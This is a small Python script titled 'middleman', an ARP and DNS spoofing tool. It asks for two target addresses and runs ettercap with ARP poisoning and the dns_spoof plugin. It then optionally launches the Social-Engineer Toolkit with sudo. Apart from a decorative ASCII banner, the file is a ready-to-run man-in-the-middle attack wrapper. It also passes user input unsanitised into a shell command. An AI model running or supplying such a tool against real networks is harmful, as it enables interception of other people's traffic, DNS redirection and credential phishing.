"""
----------------------------------------
# middleman - arp and dns spoofing tool
----------------------------------------
"""
__author__ = "z0nd3rl1ng"
__version__ = "0.0.1"

import os, random

def menu():
    banner()
    interface = "enp0s5"
    plugin = "dns_spoof"
    arpSpoof(interface,plugin)

def arpSpoof(interface,plugin):        
    if plugin == "dns_spoof":
        target1 = input("\n──╼┤1st TARGET├─> ")
        target2 = input("──╼┤2nd TARGET├─> ")
        print("\n")
        command = "ettercap -T -S -i "+interface+" -P "+plugin+" -M arp:remote /"+target1+"// /"+target2+"//"
        os.system(command)
        setoolkit = input("──╼┤LAUNCH SET?(Y/n)├─> ")
        if setoolkit == "Y":
            os.system("sudo setoolkit")
        elif setoolkit == "y":
            os.system("sudo setoolkit")
        else:
            exit() 
        
def banner():

	padding = '  '
	M = [[' ','┌','┐','┌','┐'],
	     [' ','│','└','┘','│'],
	     [' ','┴',' ',' ','┴']]
	I = [[' ',' ','┬',' '],
         [' ',' ','│',' '],
         [' ',' ','┴',' ']]
	D = [[' ','┬','─','┐'],
	     [' ','│',' ','│'],
	     [' ','┴','─','┘']]
	L = [[' ','┬',' ',' '],
	     [' ','│',' ',' '],
	     [' ','┴','─','┘']]
	E = [[' ','┌','─','┐'],
	     [' ','├','┤',' '],
	     [' ','└','─','┘']]
	A = [[' ','┌','─','┐'],
         [' ','├','─','┤'],
         [' ','┴',' ','┴']]
	N = [[' ','┌','┐','┬'],
         [' ','│','│','│'],
         [' ','┴','└','┘']]
	
	banner = [M,I,D,D,L,E,M,A,N]
	final = []
	print('\r')
	init_color = random.randint(10,40)
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{padding}               by z0nd3rl1ng\n')

if __name__ == "__main__":
	menu()
